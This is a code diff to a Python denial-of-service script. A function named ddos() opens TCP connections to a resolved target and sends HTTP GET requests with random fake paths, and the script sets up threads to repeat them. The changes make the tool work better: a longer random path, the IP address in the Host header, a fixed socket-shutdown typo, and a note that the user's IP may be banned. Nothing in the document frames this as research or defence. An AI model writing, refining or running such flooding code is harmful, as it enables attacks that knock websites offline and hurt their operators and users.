@@ -23,12 +23,12 @@ else:
 #convert the host name to an IPv4 address
 #if the host name is already an IPv4 address nothing is changed
 ipAddr = socket.gethostbyname(hostName)
-byteHostName = hostName.encode('utf-8','ignore')#convert string > bytes
+byteHostName = ipAddr.encode('utf-8','ignore')#convert string > bytes
 
 #generates fake url path
 def fake_url():
-    message = str(string.ascii_letters + string.digits + string.punctuation)
-    url = "".join(random.sample(message,5))
+    charPool = str(string.ascii_letters + string.digits + string.punctuation)
+    url = "".join(random.sample(charPool,10))
     return url
 
 
@@ -39,13 +39,13 @@ def ddos():
     connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #https://docs.python.org/3/library/socket.html 
 
     try:
-        connection.connect((ipAddr,portNum))#establish connection using IPv4 address and port number, port my be default port 80
+        connection.connect((ipAddr,portNum))#establish connection using IPv4 address and port number, port maybe the default port 80
         connection.send(b'Get /%b HTTP/1.1\nHost: %b\n\n' % (byte_url,byteHostName))#socket.send can only accept bytes
     except socket.error:#happens if a site goes down or ip is banned
-        print ("\n Unable to establish connection, site may be down.")
+        print ("\n Unable to establish connection, site may be down or your ip has been banned.")
       
     finally:
-        connection.shutdown(socket.SHUT_RDWr)
+        connection.shutdown(socket.SHUT_RDWR)
         connection.close()
 
 threads = []
